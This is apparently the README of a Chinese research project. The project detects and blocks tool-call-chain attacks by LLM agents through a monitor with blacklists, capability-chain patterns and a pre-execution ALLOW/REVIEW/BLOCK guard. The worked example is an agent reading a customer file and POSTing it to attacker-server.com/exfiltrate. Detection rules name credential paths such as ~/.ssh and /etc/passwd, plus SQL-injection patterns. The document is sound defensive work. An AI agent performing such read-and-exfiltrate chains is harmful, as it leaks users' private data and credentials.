# 工具调用链攻击检测系统

面向大模型智能体的工具调用链攻击与权限越界检测技术研究

## 项目简介

本项目实现了一个工具调用链攻击检测与阻断系统，面向 LLM Agent 的工具调用链攻击。系统采用**四层检测架构**：

1. **权限检查** - 黑名单工具直接阻断
2. **注入检测 + 参数定级** - 检测注入攻击，评估参数危险度，标注能力
3. **能力链匹配** - 基于能力序列检测危险链（替代传统的工具名匹配）
4. **频率检查** - 按工具风险等级差异化阈值

系统提供两种使用方式：

- **事后批量检测**：对一段工具调用会话执行四层检测，生成风险报告（SAFE / SUSPICIOUS / MALICIOUS）
- **执行前判决**：Agent 每次请求工具时先通过闸口，返回 ALLOW / REVIEW / BLOCK，在攻击链的最后一步真正阻断调用（详见「执行前判决」章节）

## 项目结构

```
tool_chain_attack_detection/
├── src/
│   ├── guard.py                     # 执行前闸口 AgentGuard（evaluate / safe_execute）
│   ├── core/                        # 核心检测引擎
│   │   ├── detector.py              # 检测器（on_tool_call 事后告警 + evaluate 执行前判决）
│   │   ├── chain_matcher.py         # 能力链匹配算法
│   │   ├── permission_checker.py    # 权限策略检查（黑名单）
│   │   ├── injection_checker.py     # 注入检测 + 参数定级 + 能力标注
│   │   ├── frequency_checker.py     # 频率异常检查
│   │   └── risk_scorer.py           # 风险评分计算
│   ├── models/                      # 数据模型
│   │   ├── input.py                 # 输入格式
│   │   ├── alert.py                 # 告警模型
│   │   ├── decision.py              # 执行前判决模型 PolicyDecision
│   │   └── report.py                # 报告模型（生成 Markdown）
│   └── rules/                       # 规则配置
│       ├── permission_policy.yaml   # 权限策略（黑名单 + 工具风险等级）
│       ├── param_grading.yaml       # 参数定级配置（25 个工具）
│       ├── capability_chain_patterns.yaml  # 能力链模式（14 个功能链）
│       ├── injection_patterns.py    # 注入检测正则 + 能力标注
│       └── tool_classifier.py       # 工具分类器（兜底）
├── examples/                        # 示例数据
│   ├── dangerous_chains/            # 危险链测试（56 个样本）
│   ├── guard_demo.py                # 前置阻断演示（放行 / 挂起 / 阻断）
│   ├── injection_tests/             # 注入检测测试
│   ├── frequency_tests/             # 频率检测测试
│   ├── real_world_scenarios/        # 真实业务场景（5 个）
│   └── ...
├── tests/                           # pytest 测试（147 个用例）
├── web/                             # Web 可视化（FastAPI + React）
│   ├── backend/                     # 后端：检测 / 判决 / 报告 / 演示数据 API
│   └── frontend/                    # 前端：仪表盘 / 在线检测 / 实时拦截 / 报告
├── reports/                         # 生成的报告
├── main.py                          # 主程序入口
├── run_mvp.py                       # MVP 演示程序
└── requirements.txt                 # Python 依赖
```

## 输入输出格式

### 输入格式

输入数据为 JSON 格式，包含工具调用序列：

```json
{
  "session_id": "session_001",
  "agent_name": "customer_support_agent",
  "tool_calls": [
    {
      "tool_name": "read_file",
      "arguments": {"path": "/data/customers.csv"},
      "timestamp": "2026-10-23T10:30:00Z"
    },
    {
      "tool_name": "http_request",
      "arguments": {
        "url": "https://attacker-server.com/exfiltrate",
        "method": "POST",
        "body": "customer_data=..."
      },
      "timestamp": "2026-10-23T10:30:10Z"
    }
  ]
}
```

### 输出格式

输出为 Markdown 格式的检测报告，包含：

- **检测摘要** - 会话 ID、工具调用数、告警数、风险评分
- **风险判定** - SAFE / SUSPICIOUS / MALICIOUS
- **告警详情** - 告警类型（中英文）、能力链范围、工具参数
- **工具调用链** - 完整调用序列及参数
- **统计分析** - 工具使用频率、风险等级分布

## 检测流程详解（以 http_request 为例）

### 场景：数据外泄攻击

```
[1] read_file {path: "/data/customers.csv"}
    ↓
[2] http_request {url: "https://attacker-server.com/exfiltrate", method: "POST", body: "..."}
```

### 第 1 层：权限检查

**配置**：`permission_policy.yaml`

```yaml
forbidden_tools:
  - execute_code
  - send_email
  - python_repl
  - deploy
  - run_pipeline
  - write_permissions
```

**逻辑**：

- `read_file` 不在黑名单 → 放行
- `http_request` 不在黑名单 → 放行

**关键模块**：[permission_checker.py](file:///d:/desktop/tool_chain_attack_detection/src/core/permission_checker.py)

### 第 2 层：注入检测 + 参数定级 + 能力标注

**配置**：`injection_patterns.py` + `param_grading.yaml`

#### 2.1 注入检测

递归提取所有参数值，匹配注入正则：

```python
# injection_patterns.py
"sql_injection": {
    "patterns": [r"UNION\s+SELECT", r"DROP\s+TABLE", ...],
    "capabilities": ["PRIVATE_ACCESS", "LOCAL_MUTATION"]  # 注入命中时标注的能力
}
```

本例中 `read_file` 和 `http_request` 的参数不含注入模式 → 未命中。

#### 2.2 参数定级

**read_file**：

```yaml
# param_grading.yaml
read_file:
  params:
    path:
      risk: low
      capabilities: [PRIVATE_ACCESS]  # 默认能力
      conditions:
        - if: {patterns: ["~/.ssh/*", "*.env", "*credentials*", "/etc/passwd"]}
          then: critical
          capabilities: [PRIVATE_ACCESS, CREDENTIAL_ACCESS]  # 敏感路径
```

`path: "/data/customers.csv"` → 不匹配敏感路径 → `risk: low`, `capabilities: [PRIVATE_ACCESS]`

**http_request**：

```yaml
# param_grading.yaml
http_request:
  params:
    url:
      risk: critical
      capabilities: [EXTERNAL_ACTION]
      conditions:
        - if: {patterns: ["https://internal-api.com/*", "https://*.company.com/*", ...]}
          then: medium
          capabilities: []  # 白名单域名，无危险能力
    body:
      risk: critical
      capabilities: [EXTERNAL_ACTION]
  joint_conditions:
    # 白名单 URL + 任何参数 = 正常业务调用，无危险能力
    - when:
        url: {patterns: ["https://internal-api.com/*", ...]}
      then: medium
      capabilities: []
```

`url: "https://attacker-server.com/exfiltrate"` → 不匹配白名单 → `risk: critical`, `capabilities: [EXTERNAL_ACTION]`

`body: "..."` → `risk: critical`, `capabilities: [EXTERNAL_ACTION]`

**max 聚合**：`max(critical, critical) = critical`

**最终能力**：`[EXTERNAL_ACTION]`

**关键模块**：[injection_checker.py](file:///d:/desktop/tool_chain_attack_detection/src/core/injection_checker.py)

### 第 3 层：能力链匹配

**配置**：`capability_chain_patterns.yaml`

```yaml
# FC-1: 私有数据外泄链
- name: private_data_exfiltration
  capabilities: [PRIVATE_ACCESS, EXTERNAL_ACTION]
  risk: critical
  description: 读取内部数据后发送到外部
```

**匹配逻辑**：

```
工具调用序列：
[0] read_file  → capabilities: [PRIVATE_ACCESS]
[1] http_request → capabilities: [EXTERNAL_ACTION]

能力链模式：[PRIVATE_ACCESS, EXTERNAL_ACTION]

匹配过程：
- 检查索引 0：有 PRIVATE_ACCESS ✓ → 使用索引 0
- 检查索引 1：有 EXTERNAL_ACTION ✓ → 使用索引 1
- 完全匹配 → 触发告警
```

**告警类型**：`CAPABILITY_CHAIN`

**关键模块**：[chain_matcher.py](file:///d:/desktop/tool_chain_attack_detection/src/core/chain_matcher.py)

### 第 4 层：频率检查

**配置**：`permission_policy.yaml`

```yaml
tool_risk_levels:
  http_request: critical

frequency_limits:
  max_calls_per_minute: 10
  window_seconds: 60
```

**逻辑**：

- `http_request` 风险等级：`critical`
- 阈值：3 次/分钟
- 本例中只调用 1 次 → 未超限

**关键模块**：[frequency_checker.py](file:///d:/desktop/tool_chain_attack_detection/src/core/frequency_checker.py)

### 最终结果

```
告警类型: CAPABILITY_CHAIN（能力链告警）
风险等级: CRITICAL
风险评分: 70/100
能力链模式: private_data_exfiltration
能力序列: PRIVATE_ACCESS → EXTERNAL_ACTION
危险链范围: 第 1 步 → 第 2 步
```

## 执行前判决（真阻断）

批量报告模式只能事后告警。为在工具真正执行前拦截，系统提供一条独立的判决路径：

```
Agent 请求工具 → evaluate() → ALLOW / REVIEW / BLOCK → 执行 / 挂起审批 / 丢弃
```

- `RealTimeDetector.evaluate(tool_call) -> PolicyDecision`（`src/core/detector.py`）
- `AgentGuard.evaluate(...)` / `AgentGuard.safe_execute(..., executor)`（`src/guard.py`）：BLOCK 和 REVIEW 不会调用 executor
- HTTP 接口：`POST /api/guard/evaluate`
- Web 页面：`/guard`（实时拦截）

### 判决规则（混合方案）

| 判决 | 触发条件 |
| --- | --- |
| **BLOCK** | 黑名单工具；任一 critical 级告警（注入 / critical 能力链）；会话已失守且当前工具为 critical |
| **REVIEW** | high 级告警；工具风险 ≥ high 且参数风险 ≥ high（单步高危操作） |
| **ALLOW + 留痕** | medium 级告警，或工具风险 ≥ medium（`log_required = true`） |
| **ALLOW** | 其余情况 |

补充规则：

- 被拦截的调用同样写入会话历史（留痕，不回收）
- 命中 BLOCK 后会话标记为**失守**，之后 critical 工具一律拦截；会话之间相互隔离
- 能力链匹配但相关参数全为低危时跳过，避免误拦正常业务
- REVIEW 仅返回 `approval_required: true` 标记，审批界面不在本系统范围内

### 请求示例

```json
POST /api/guard/evaluate
{
  "session_id": "s1",
  "agent_name": "customer_support_agent",
  "tool_name": "http_request",
  "arguments": {"url": "https://attacker-server.com/exfiltrate", "method": "POST"},
  "timestamp": "2026-10-23T10:30:10Z"
}
```

### 响应示例

```json
{
  "session_id": "s1",
  "tool_name": "http_request",
  "action": "BLOCK",
  "reason": "命中 critical 级告警（能力链），能力链 private_data_exfiltration",
  "risk_level": "critical",
  "risk_score": 95.0,
  "alert_types": ["CAPABILITY_CHAIN"],
  "matched_chain": "private_data_exfiltration",
  "log_required": true,
  "approval_required": false,
  "session_compromised": true
}
```

演示脚本（3 个场景：数据外泄链、单步高危、黑名单工具）：

```bash
python examples/guard_demo.py
```

## 快速开始

### 1. 安装依赖

```bash
pip install -r requirements.txt
```

### 2. 运行单个测试

```bash
# 检测攻击场景
python main.py --input examples/dangerous_chains/attack_session.json --output reports/attack_report.md

# 检测正常场景
python main.py --input examples/normal_chains/normal_session.json --output reports/normal_report.md
```

### 3. 运行 MVP 演示

```bash
python run_mvp.py
```

MVP 程序会运行 12 个测试场景：

- 7 个原有数据集（各 1 个文件）
- 5 个真实业务场景（3 个危险 + 2 个安全）

报告输出到 `reports/mvp/` 目录。

### 4. 前置阻断演示

```bash
python examples/guard_demo.py
```

模拟 Agent 逐步调用工具并通过执行前闸口，打印每次判决（✅ 放行 / ⏸ 挂起待审批 / ⛔ 阻断）及被拦截的步骤。

### 5. 运行测试

```bash
pip install pytest
python -m pytest tests/ -q
```

共 147 个用例，覆盖四层检测、执行前判决、会话失守、能力链匹配等。

### 6. 启动 Web 界面

```bash
# 后端（端口 8000）
cd web/backend
pip install -r requirements.txt
python run.py

# 前端（另开终端，端口 5173，/api 代理到后端）
cd web/frontend
npm install
npm run dev
```

浏览器打开 http://localhost:5173 。

### 7. 查看报告

打开生成的 Markdown 报告，查看：

- 检测摘要
- 告警详情（能力链范围、工具参数）
- 工具调用链
- 统计分析

## Web 可视化界面

前后端分离（FastAPI + React/Vite），深色主题。

### 页面

| 路由 | 页面 | 功能 |
| --- | --- | --- |
| `/` | 仪表盘 | 报告总数、告警统计、判定分布、最近报告 |
| `/detect` | 在线检测 | 提交工具调用序列，执行四层检测并生成报告 |
| `/guard` | 实时拦截 | 逐个工具调用过闸口（自动回放 / 单步执行），展示 ALLOW / REVIEW / BLOCK、命中链与会话失守状态 |
| `/reports` | 报告列表 | 历史报告管理（查看 / 删除） |
| `/reports/:id` | 报告详情 | 告警详情、工具调用链、Markdown 报告下载 |

### 接口

| 方法 | 路径 | 说明 |
| --- | --- | --- |
| POST | `/api/detect/session` | 批量检测一个会话并生成报告 |
| POST | `/api/guard/evaluate` | 单次工具调用的执行前判决 |
| GET | `/api/reports` | 报告列表 |
| GET | `/api/reports/{id}` | 报告详情 |
| GET | `/api/reports/{id}/markdown` | 下载 Markdown 报告 |
| DELETE | `/api/reports/{id}` | 删除报告 |
| GET | `/api/examples` | 演示数据分类列表 |
| GET | `/api/examples/content` | 读取指定演示数据 |

## 能力链模式库

项目包含 14 个功能链（FC-1 ~ FC-14，编号连续）。对 56 个危险链样本的实测覆盖：20 个含黑名单工具在权限层直接阻断，36 个可达样本中 24 个命中功能链告警、3 个因参数全低危被跳过（预期行为）、9 个因样本参数问题未命中：

| 功能链 | 能力序列                                           | 覆盖场景     |
| ------ | -------------------------------------------------- | ------------ |
| FC-1   | PRIVATE_ACCESS → EXTERNAL_ACTION                  | 数据外泄     |
| FC-2   | CREDENTIAL_ACCESS → EXTERNAL_ACTION               | 凭据外泄     |
| FC-3   | LOCAL_MUTATION → EXTERNAL_ACTION                  | 变更后外传   |
| FC-4   | EXTERNAL_INGESTION → LOCAL_MUTATION               | 外部数据污染 |
| FC-5   | EXTERNAL_INGESTION → PRIVATE_ACCESS               | 外部数据注入 |
| FC-6   | PRIVATE_ACCESS → LOCAL_MUTATION                   | 读取后变更   |
| FC-7   | LOCAL_MUTATION → PRIVATE_ACCESS                   | 变更后读取   |
| FC-8   | EXTERNAL_INGESTION → EXTERNAL_ACTION              | 外部内容外传 |
| FC-9   | EXTERNAL_ACTION → LOCAL_MUTATION                  | 外部动作到本地变更 |
| FC-10  | EXTERNAL_ACTION → PRIVATE_ACCESS                  | 外联后回读   |
| FC-11  | EXTERNAL_INGESTION → 多能力                       | 外部到多能力 |
| FC-12  | PRIVATE_ACCESS + LOCAL_MUTATION + PRIVILEGE_CHANGE | 敏感路径提权 |
| FC-13  | LOCAL_MUTATION + EXTERNAL_ACTION → 多能力         | Git 到多能力 |
| FC-14  | PRIVATE_ACCESS → PRIVILEGE_CHANGE                 | 读取后提权   |

完整配置见：[capability_chain_patterns.yaml](file:///d:/desktop/tool_chain_attack_detection/src/rules/capability_chain_patterns.yaml)

## 风险评分系统

- **SAFE（安全）**: 0-29 分
- **SUSPICIOUS（可疑）**: 30-69 分
- **MALICIOUS（恶意）**: 70-100 分

评分因素：

- 告警类型权重（CAPABILITY_CHAIN: 45, INJECTION_DETECTED: 50, ...）
- 风险等级加成（critical: +40, high: +25, ...）
- 能力链长度加成（每个能力 +5，最高 +20）
- 频率异常程度

## 待探讨问题：MCP 动态工具检测

当前检测系统基于**静态配置表**（`param_grading.yaml`、`permission_policy.yaml`）对工具进行风险定级和能力标注。这一设计隐含一个前提：**Agent 只会调用工具注册表中已注册的工具**，因此配置表中的工具名称应与注册表保持一致。

然而，在 MCP（Model Context Protocol）场景下，工具注册是**动态**的：Agent 连接 MCP 服务器后，会通过 `tools/list` 方法获取服务器提供的工具列表，并动态注册到本地工具注册表。这意味着：

1. **工具集合不确定**：不同 MCP 服务器可能提供不同的工具，工具名称、参数结构、功能语义各不相同
2. **配置表无法穷举**：静态配置无法预先覆盖所有可能的 MCP 工具
3. **新工具缺乏定级依据**：未登记的工具只能走 `tool_classifier.py` 的正则兜底分类，无法进行精确的参数级能力标注

因此，对于 MCP 场景，可能需要引入**新工具检测机制**：

- **LLM 辅助标注**：利用 LLM 理解工具描述和参数结构，自动推断工具能力（如判断某工具是否具有 `EXTERNAL_ACTION` 能力）
- **人工审核流程**：对 LLM 标注结果进行人工复核，确认后将新工具纳入配置表
- **动态配置生成**：结合 LLM 和人工审核，自动生成 `param_grading.generated.yaml` 待复核配置
